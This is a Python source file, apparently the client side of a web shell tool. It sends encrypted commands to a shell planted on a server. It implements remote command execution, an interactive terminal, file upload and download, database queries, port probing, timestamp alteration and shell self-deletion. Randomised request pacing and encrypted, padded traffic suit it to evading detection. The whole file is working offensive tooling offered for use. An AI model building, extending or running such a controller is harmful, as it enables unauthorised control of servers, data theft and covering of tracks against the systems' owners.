"""HTTP transport + high level operations for a web shell.

Every request is hand-built: the JSON operation is encrypted with SM4-CBC,
base64 wrapped, then sent as ``data=<b64>`` (form) or as a raw body.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Iterable
from urllib.parse import quote_plus

from . import protocol, transport as transport_mod
from .config import ShellConfig

DEFAULT_CHUNK = 512 * 1024

TraceHook = Callable[[dict[str, Any]], None]
ProgressHook = Callable[[int, int], bool | None]


class ShellError(Exception):
    """A shell level failure (code != 0) or a transport failure."""

    def __init__(self, message: str, code: int = -1, data: dict[str, Any] | None = None) -> None:
        super().__init__(message)
        self.code = code
        self.data = data or {}


@dataclass
class RemoteEntry:
    name: str
    type: str = "file"
    size: int = 0
    mtime: int = 0
    perm: str = ""
    owner: str = ""
    mode: int = 0
    target: str = ""
    readable: bool = True
    writable: bool = True
    executable: bool = False
    path: str = ""

    @classmethod
    def from_payload(cls, data: dict[str, Any], parent: str = "") -> "RemoteEntry":
        base = parent.rstrip("/")
        name = str(data.get("name", ""))
        return cls(
            name=name,
            type=str(data.get("type", "file")),
            size=int(data.get("size") or 0),
            mtime=int(data.get("mtime") or 0),
            perm=str(data.get("perm") or ""),
            owner=str(data.get("owner") or ""),
            mode=int(data.get("mode") or 0),
            target=str(data.get("target") or ""),
            readable=bool(data.get("readable", 1)),
            writable=bool(data.get("writable", 1)),
            executable=bool(data.get("executable", 0)),
            path=f"{base}/{name}" if base else name,
        )


@dataclass
class CommandResult:
    output: str
    cwd: str = ""
    exit_code: int = 0


@dataclass
class DirListing:
    path: str
    parent: str
    entries: list[RemoteEntry] = field(default_factory=list)
    free: int | None = None


@dataclass
class TransferStats:
    bytes_done: int = 0
    total: int = 0
    elapsed: float = 0.0
    resumed_from: int = 0
    skipped: bool = False

    @property
    def rate(self) -> float:
        return self.bytes_done / self.elapsed if self.elapsed > 0 else 0.0


class ShellClient:
    def __init__(self, config: ShellConfig, on_trace: TraceHook | None = None) -> None:
        self.config = config
        self.on_trace = on_trace
        self._lock = threading.RLock()  # pacing timestamps only
        self._sem = threading.BoundedSemaphore(max(1, min(16, int(getattr(config, "concurrency", 4) or 4))))
        self.transport_warning = ""
        try:
            self.transport = transport_mod.make_transport(config)
        except transport_mod.TransportError as exc:
            self.transport_warning = str(exc)
            self.transport = transport_mod.RequestsTransport(config)
        self.last_response: protocol.Response | None = None
        self.connected = False
        self._last_request_at = 0.0
        self._limits_cache: dict[str, Any] | None = None
        self.term_cols = 80
        self.term_rows = 24

    # ------------------------------------------------------------------ http
    def _headers(self) -> dict[str, str]:
        headers = {
            "User-Agent": self.config.user_agent,
            "Accept": "*/*",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Cache-Control": "no-cache",
        }
        if self.config.body_mode == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            headers["Content-Type"] = "text/plain; charset=UTF-8"
        headers.update({k: v for k, v in self.config.headers.items() if k})
        return headers

    def _build_body(self, carrier: str) -> bytes:
        if self.config.body_mode == "raw":
            return carrier.encode("ascii")
        param = self.config.pass_param or "data"
        return f"{param}={quote_plus(carrier)}".encode("ascii")

    def _prepare_request(self, payload: dict[str, Any]) -> protocol.WireRequest:
        if self.config.proto == "v2":
            return protocol.build_v2_body(
                payload,
                self.config.secret,
                self.config.salt,
                carrier=self.config.carrier,
                pass_param=self.config.pass_param,
                pad_bucket=self.config.pad_bucket,
            )
        carrier = protocol.encode_request(payload, self.config.key, self.config.iv)
        return protocol.WireRequest(
            self.config.method.upper(),
            self._build_body(carrier),
            {"Content-Type": self._headers().get("Content-Type", "application/x-www-form-urlencoded")},
            "form" if self.config.body_mode == "form" else "raw",
        )

    def _pace(self) -> None:
        """Optional human-ish pacing: minimum interval + random jitter.

        The timestamp is *reserved* under the lock so concurrent requests
        keep the configured spacing instead of all sleeping at once.
        """
        interval = max(0.0, float(self.config.min_interval or 0))
        jitter = max(0.0, float(self.config.jitter or 0))
        with self._lock:
            now = time.monotonic()
            wait = max(0.0, self._last_request_at + interval - now)
            self._last_request_at = now + wait
        if wait > 0:
            time.sleep(wait)
        if jitter:
            time.sleep(random.uniform(0, jitter))

    def _send(self, payload: dict[str, Any], timeout: float | None = None) -> protocol.Response:
        started = time.time()
        self._pace()
        wire = self._prepare_request(payload)
        transport = self.transport
        body = wire.body
        error: Exception | None = None
        text = ""
        status = 0
        resp: requests.Response | None = None
        for attempt in range(2):
            try:
                with self._sem:
                    resp = transport.request(
                        wire.method,
                        self.config.url,
                        body=body,
                        headers={**self._headers(), **wire.headers},
                        timeout=timeout or self.config.timeout,
                        proxy=self.config.proxy,
                        verify=self.config.verify_ssl,
                    )
                status = resp.status
                text = resp.text
                error = None
                break
            except transport_mod.TransportError as exc:  # network hiccup -> one retry
                error = exc
                time.sleep(0.35)
        elapsed = time.time() - started
        trace = {
            "time": time.strftime("%H:%M:%S"),
            "op": payload.get("op", ""),
            "payload": payload,
            "carrier": wire.carrier,
            "proto": self.config.proto,
            "body": body.decode("ascii", "replace")[:4000],
            "status": status,
            "request_headers": self._headers(),
            "response_raw": text,
            "elapsed": elapsed,
            "ok": False,
            "note": "",
        }
        if error is not None:
            trace["note"] = f"transport error: {error}"
            self._trace(trace)
            raise ShellError(f"transport error: {error}") from error
        try:
            if self.config.proto == "v2":
                parsed = protocol.decode_response_v2(
                    text,
                    self.config.secret,
                    self.config.salt,
                    elapsed=elapsed,
                    skew=self.config.ts_window,
                )
            else:
                parsed = protocol.decode_response(text, self.config.key, self.config.iv, elapsed=elapsed)
        except protocol.ProtocolError as exc:
            trace["note"] = f"protocol error: {exc.snippet()}"
            self._trace(trace)
            raise ShellError(
                "response could not be decrypted — wrong key/iv, dead shell, or a blocking page "
                f"(HTTP {status}): {exc.snippet()}"
            ) from exc
        trace["ok"] = parsed.ok
        trace["response"] = {"code": parsed.code, "msg": parsed.msg, "data": parsed.data}
        trace["note"] = parsed.msg if not parsed.ok else ""
        self._trace(trace)
        self.last_response = parsed
        return parsed

    def _trace(self, record: dict[str, Any]) -> None:
        if self.on_trace is not None:
            try:
                self.on_trace(record)
            except Exception:  # never let a UI hook break the transport
                pass

    def call(self, op: str, req_timeout: float | None = None, **fields: Any) -> dict[str, Any]:
        payload = protocol.build_payload(op, **fields)
        response = self._send(payload, timeout=req_timeout)
        if not response.ok:
            raise ShellError(response.msg or f"op {op} failed", response.code, response.data)
        return response.data

    # --------------------------------------------------------------- session
    def set_terminal_size(self, cols: int, rows: int) -> None:
        self.term_cols = max(20, min(500, int(cols)))
        self.term_rows = max(5, min(200, int(rows)))

    def _term(self, cols: int | None, rows: int | None) -> tuple[int, int]:
        return (int(cols) if cols else self.term_cols, int(rows) if rows else self.term_rows)

    def ping(self) -> dict[str, Any]:
        data = self.call("ping")
        self.connected = True
        return data

    def info(self) -> dict[str, Any]:
        data = self.call("info")
        if data.get("os"):
            self.config.os_type = str(data["os"])
        if data.get("cwd"):
            self.config.cwd = str(data["cwd"])
        return data

    # -------------------------------------------------------------- commands
    def run(
        self,
        command: str,
        cwd: str | None = None,
        timeout: int = 30,
        cols: int | None = None,
        rows: int | None = None,
    ) -> CommandResult:
        c, r = self._term(cols, rows)
        data = self.call(
            "cmd",
            text=command,
            cwd=cwd if cwd is not None else self.config.cwd,
            timeout=timeout,
            cols=c,
            rows=r,
        )
        self._sync_cwd(data.get("cwd"))
        return CommandResult(
            output=str(data.get("output", "")),
            cwd=str(data.get("cwd", self.config.cwd)),
            exit_code=int(data.get("exit", 0) or 0),
        )

    def terminal(
        self,
        line: str,
        cwd: str | None = None,
        cols: int | None = None,
        rows: int | None = None,
    ) -> CommandResult:
        c, r = self._term(cols, rows)
        data = self.call(
            "terminal",
            line=line,
            cwd=cwd if cwd is not None else self.config.cwd,
            cols=c,
            rows=r,
        )
        self._sync_cwd(data.get("cwd"))
        return CommandResult(output=str(data.get("output", "")), cwd=str(data.get("cwd", self.config.cwd)))

    def _sync_cwd(self, cwd: Any) -> None:
        if isinstance(cwd, str) and cwd:
            self.config.cwd = cwd

    # ------------------------------------------------------------------ files
    def ls(self, path: str | None = None) -> DirListing:
        data = self.call("ls", path=path if path is not None else self.config.cwd)
        resolved = str(data.get("path", path or ""))
        listing = DirListing(
            path=resolved,
            parent=str(data.get("parent", resolved)),
            entries=[RemoteEntry.from_payload(item, resolved) for item in data.get("entries", [])],
            free=data.get("free"),
        )
        return listing

    def stat(self, path: str) -> dict[str, Any]:
        return self.call("stat", path=path)

    def read_chunk(self, path: str, offset: int = 0, length: int = DEFAULT_CHUNK) -> dict[str, Any]:
        data = self.call("read", path=path, offset=offset, length=length)
        raw = base64.b64decode(data.get("data") or "")
        return {
            "data": raw,
            "offset": int(data.get("offset", offset)),
            "length": len(raw),
            "size": int(data.get("size", 0)),
            "eof": bool(data.get("eof")),
        }

    def read_bytes(self, path: str, limit: int | None = None, chunk: int = DEFAULT_CHUNK) -> bytes:
        out = bytearray()
        offset = 0
        while True:
            part = self.read_chunk(path, offset, chunk)
            out.extend(part["data"])
            offset += part["length"]
            if part["eof"] or part["length"] == 0:
                break
            if limit is not None and len(out) >= limit:
                break
        return bytes(out if limit is None else out[:limit])

    def read_text(self, path: str, error: str = "replace", limit: int = 4 * 1024 * 1024) -> str:
        raw = self.read_bytes(path, limit=limit)
        return raw.decode(self.config.charset or "utf-8", error)

    def limits(self, refresh: bool = False) -> dict[str, Any]:
        """Server-side post_max_size / memory_limit etc., cached."""
        if self._limits_cache is None or refresh:
            try:
                self._limits_cache = self.call("limits")
            except ShellError:
                self._limits_cache = {}
        return self._limits_cache or {}

    def chunk_size(self) -> int:
        base = max(16 * 1024, int(self.config.chunk_kb or 512) * 1024)
        limits = self.limits()
        post_max = int(limits.get("post_max_size") or 0)
        if post_max > 0:
            base = min(base, max(16 * 1024, int(post_max * 0.5)))
        return base

    def hash_file(self, path: str, algo: str = "md5") -> dict[str, Any]:
        return self.call("hash", path=path, algo=algo)

    def hash_range(self, path: str, offset: int = 0, length: int = 0, algo: str = "sha256") -> dict[str, Any]:
        return self.call("hash", path=path, algo=algo, offset=offset, length=length)

    def set_mtime(self, path: str, ref: str = "", ts: int | None = None) -> dict[str, Any]:
        return self.call("mtime", path=path, ref=ref, ts=ts)

    def probe_port(self, host: str, port: int, timeout: float = 2.0) -> dict[str, Any]:
        return self.call("net", host=host, port=port, timeout=timeout)

    def self_delete(self, confirm: bool = False) -> dict[str, Any]:
        return self.call("selfdel", confirm=1 if confirm else 0)

    def write_bytes(self, path: str, data: bytes, mkdir: bool = True) -> int:
        written = 0
        first = True
        if not data:
            self.call("write", path=path, data="", offset=0, mkdir=mkdir)
            return 0
        step = self.chunk_size()
        for offset in range(0, len(data), step):
            chunk = data[offset : offset + step]
            result = self.call(
                "write",
                path=path,
                data=base64.b64encode(chunk).decode("ascii"),
                offset=0 if first else offset,
                mkdir=mkdir and first,
            )
            written += int(result.get("written", len(chunk)))
            first = False
        return written

    def write_text(self, path: str, text: str) -> int:
        return self.write_bytes(path, text.encode(self.config.charset or "utf-8"))

    def _resume_offset(self, local: Path, remote_path: str, total: int) -> int:
        """Return the byte offset a resumable upload can continue from."""
        try:
            info = self.stat(remote_path)
        except ShellError:
            return 0
        if str(info.get("type", "file")) != "file":
            return 0
        remote_size = int(info.get("size") or 0)
        if remote_size <= 0 or remote_size > total:
            return 0
        if remote_size == total:
            return total
        probe = min(remote_size, 1024 * 1024)
        with local.open("rb") as fh:
            head = fh.read(probe)
        try:
            remote_hash = self.hash_range(remote_path, 0, probe).get("hash")
        except ShellError:
            return 0
        if remote_hash and remote_hash == hashlib.sha256(head).hexdigest():
            return remote_size
        return 0

    def upload_file(
        self,
        local_path: str | os.PathLike[str],
        remote_path: str,
        progress: ProgressHook | None = None,
        cancel: Callable[[], bool] | None = None,
        resume: bool = True,
    ) -> TransferStats:
        local = Path(local_path)
        total = local.stat().st_size
        start = 0
        if resume and total > 0:
            start = self._resume_offset(local, remote_path, total)
        stats = TransferStats(total=total, resumed_from=start)
        if start >= total:
            stats.bytes_done = total
            stats.skipped = True
            return stats

        started = time.time()
        step = self.chunk_size()
        offset = start
        with local.open("rb") as fh:
            if start:
                fh.seek(start)
            while True:
                if cancel and cancel():
                    raise ShellError("upload cancelled")
                chunk = fh.read(step)
                if not chunk:
                    break
                self.call(
                    "write",
                    path=remote_path,
                    data=base64.b64encode(chunk).decode("ascii"),
                    offset=0 if offset == 0 else offset,
                    mkdir=(offset == 0),
                )
                offset += len(chunk)
                stats.bytes_done = offset
                stats.elapsed = time.time() - started
                if progress and progress(offset, total) is False:
                    raise ShellError("upload cancelled")
        stats.elapsed = time.time() - started
        return stats

    def upload_tree(
        self,
        local_dir: str | os.PathLike[str],
        remote_dir: str,
        progress: ProgressHook | None = None,
        cancel: Callable[[], bool] | None = None,
        resume: bool = True,
        include_root: bool = True,
    ) -> dict[str, Any]:
        """Upload a directory tree.

        include_root=True  ->  remote_dir/<dirname>/...   (drag & drop semantics)
        include_root=False ->  remote_dir/...             (merge into target)
        """
        local = Path(local_dir)
        if not local.is_dir():
            raise ShellError(f"not a directory: {local}")
        base = (remote_dir.rstrip("/") or "") + ("/" + local.name if include_root else "")
        self.mkdir(base)
        root = local
        all_files = [p for p in sorted(local.rglob("*")) if p.is_file()]
        total = sum(p.stat().st_size for p in all_files)
        files = 0
        sent = 0
        for path in sorted(local.rglob("*")):
            if cancel and cancel():
                raise ShellError("upload cancelled")
            relative = path.relative_to(root).as_posix()
            target = f"{base}/{relative}"
            if path.is_dir():
                self.mkdir(target)
                continue
            base_done = sent

            def report(done: int, _total: int, base_done: int = base_done) -> bool | None:
                if progress is None:
                    return True
                return progress(base_done + done, total)

            stats = self.upload_file(path, target, progress=report if progress else None, cancel=cancel, resume=resume)
            files += 1
            sent += path.stat().st_size
        return {"root": base, "files": files, "bytes": sent, "total": total}

    def download_file(
        self,
        remote_path: str,
        local_path: str | os.PathLike[str],
        progress: ProgressHook | None = None,
        cancel: Callable[[], bool] | None = None,
        resume: bool = True,
    ) -> TransferStats:
        target = Path(local_path)
        target.parent.mkdir(parents=True, exist_ok=True)

        remote_size = 0
        try:
            remote_size = int(self.stat(remote_path).get("size") or 0)
        except ShellError:
            remote_size = 0

        start = 0
        if resume and target.exists() and target.stat().st_size > 0:
            local_size = target.stat().st_size
            if remote_size and local_size >= remote_size:
                return TransferStats(
                    bytes_done=local_size, total=remote_size, resumed_from=local_size, skipped=True
                )
            probe = min(local_size, 1024 * 1024)
            with target.open("rb") as fh:
                head = fh.read(probe)
            remote_head = None
            try:
                if remote_size:
                    remote_head = self.hash_range(remote_path, 0, probe).get("hash")
            except ShellError:
                remote_head = None
            if remote_head and remote_head == hashlib.sha256(head).hexdigest():
                start = local_size

        stats = TransferStats(total=remote_size or 0, resumed_from=start)
        started = time.time()
        mode = "ab" if start else "wb"
        offset = start
        with target.open(mode) as fh:
            while True:
                if cancel and cancel():
                    raise ShellError("download cancelled")
                part = self.read_chunk(remote_path, offset, self.chunk_size())
                fh.write(part["data"])
                offset += part["length"]
                stats.bytes_done = offset
                stats.total = part["size"] or offset
                stats.elapsed = time.time() - started
                if progress and progress(offset, stats.total) is False:
                    raise ShellError("download cancelled")
                if part["eof"] or part["length"] == 0:
                    break
        stats.elapsed = time.time() - started
        return stats

    def delete(self, paths: Iterable[str], recursive: bool = True) -> list[dict[str, Any]]:
        return list(self.call("rm", paths=list(paths), recursive=recursive).get("results", []))

    def rename(self, src: str, dst: str) -> dict[str, Any]:
        return self.call("mv", src=src, dst=dst)

    def copy(self, src: str, dst: str) -> dict[str, Any]:
        return self.call("cp", src=src, dst=dst)

    def mkdir(self, path: str, mode: int = 0o777) -> dict[str, Any]:
        return self.call("mkdir", path=path, mode=mode)

    def touch(self, path: str) -> dict[str, Any]:
        return self.call("touch", path=path)

    def chmod(self, path: str, mode: int) -> dict[str, Any]:
        return self.call("chmod", path=path, mode=mode)

    def zip(self, paths: Iterable[str], dest: str) -> dict[str, Any]:
        return self.call("zip", paths=list(paths), dest=dest)

    def unzip(self, path: str, dest: str) -> dict[str, Any]:
        return self.call("unzip", path=path, dest=dest)

    def find(self, path: str, keyword: str = "", depth: int = 4, limit: int = 500) -> list[RemoteEntry]:
        data = self.call("find", path=path, keyword=keyword, depth=depth, limit=limit)
        root = str(data.get("root", path))
        return [RemoteEntry.from_payload(item, "") for item in data.get("entries", [])]

    # -------------------------------------------------------------------- db
    def db_query(
        self,
        sql: str,
        host: str = "127.0.0.1",
        port: int = 3306,
        user: str = "root",
        password: str = "",
        dbname: str = "",
        driver: str = "mysql",
        charset: str = "utf8mb4",
    ) -> dict[str, Any]:
        return self.call(
            "db",
            sql=sql,
            host=host,
            port=port,
            user=user,
            dbname=dbname,
            driver=driver,
            charset=charset,
            **{"pass": password},
        )

    # --------------------------------------------------------------- streaming
    def stream_start(
        self,
        command: str,
        cwd: str | None = None,
        cols: int | None = None,
        rows: int | None = None,
    ) -> dict[str, Any]:
        """Launch a background command; returns {handle, pid, cursor, out}."""
        c, r = self._term(cols, rows)
        return self.call(
            "stream",
            action="start",
            text=command,
            cwd=cwd if cwd is not None else self.config.cwd,
            cols=c,
            rows=r,
        )

    def stream_poll(self, handle: str, cursor: int = 0, limit: int = 262144) -> dict[str, Any]:
        data = self.call("stream", action="poll", handle=handle, cursor=int(cursor), limit=int(limit))
        return {
            "data": base64.b64decode(data.get("data") or ""),
            "cursor": int(data.get("cursor", cursor)),
            "size": int(data.get("size", 0)),
            "running": bool(data.get("running")),
            "eof": bool(data.get("eof")),
        }

    def stream_stop(self, handle: str) -> dict[str, Any]:
        return self.call("stream", action="stop", handle=handle)

    def stream(
        self,
        command: str,
        cwd: str | None = None,
        on_chunk: Callable[[bytes, bool, bool], bool | None] | None = None,
        should_stop: Callable[[], bool] | None = None,
        initial_delay: float = 0.2,
        max_delay: float = 1.6,
        max_seconds: float = 3600.0,
    ) -> dict[str, Any]:
        """Run a command with incremental output; returns a summary dict.

        ``on_chunk(data, running, eof)`` is called for every poll; returning
        False (or ``should_stop()`` becoming True) stops the stream.
        """
        started = time.time()
        handle = ""
        output = 0
        delay = initial_delay
        try:
            start = self.stream_start(command, cwd)
            handle = str(start["handle"])
            cursor = 0
            while True:
                if should_stop and should_stop():
                    break
                part = self.stream_poll(handle, cursor)
                cursor = part["cursor"]
                output += len(part["data"])
                if on_chunk is not None and on_chunk(part["data"], part["running"], part["eof"]) is False:
                    break
                if part["eof"]:
                    break
                if time.time() - started > max_seconds:
                    break
                delay = initial_delay if part["data"] else min(max_delay, delay * 1.4)
                time.sleep(delay)
            return {"handle": handle, "bytes": output, "stopped": bool(should_stop and should_stop())}
        finally:
            if handle and (should_stop and should_stop()):
                try:
                    self.stream_stop(handle)
                except ShellError:
                    pass

    # ----------------------------------------------------------------- misc
    def close(self) -> None:
        self.transport.close()


def encode_carrier(payload: dict[str, Any], key: str, iv: str) -> str:
    """Exposed for tests / debugging: JSON -> SM4-CBC -> base64."""
    return protocol.encode_request(payload, key, iv)
